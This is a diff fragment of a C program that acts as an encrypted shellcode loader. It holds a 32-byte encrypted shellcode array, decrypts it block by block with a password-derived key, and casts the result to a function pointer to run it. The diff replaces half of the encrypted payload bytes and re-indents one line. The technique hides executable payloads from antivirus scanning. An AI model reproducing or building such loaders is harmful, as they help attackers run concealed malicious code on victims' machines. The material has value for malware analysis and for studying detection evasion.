@@ -389,7 +389,7 @@ int main(int argc, char **argv)
     // int key_len = strlen(argv[1]);
     int key_len = strlen(password);
     BYTE shellcode[] = \
-        "\x55\x9B\x2B\x3A\x9E\x73\x23\xCE\xC5\x7B\x61\xDC\x97\x40\x29\xC9\x9B\xC7\x60\x94\xE0\xB4\x97\x24\x6E\xB1\x44\x60\xF3\x7C\xBF\xA6";
+        "\x55\x9B\x2B\x3A\x9E\x73\x23\xCE\xC5\x7B\x61\xDC\x97\x40\x29\xC9\x83\x49\x59\x5E\xE7\x28\x9B\x46\x79\xB2\x8E\x73\x04\x64\x11\x54";
     int shellcode_len = strlen((char*)shellcode);
     int (*ret)() = (int(*)())shellcode;
 
@@ -405,7 +405,7 @@ int main(int argc, char **argv)
         //printf("before-->"); printHex(plaintext, 16); printf("\n");
         decrypt(K, QF, plaintext);
         //printf("after--->"); printHex(plaintext, 16); printf("\n");
-	printHex(plaintext, 16);
+	    printHex(plaintext, 16);
         memcpy(&shellcode[i], plaintext, 16);
         i += 16;
     }
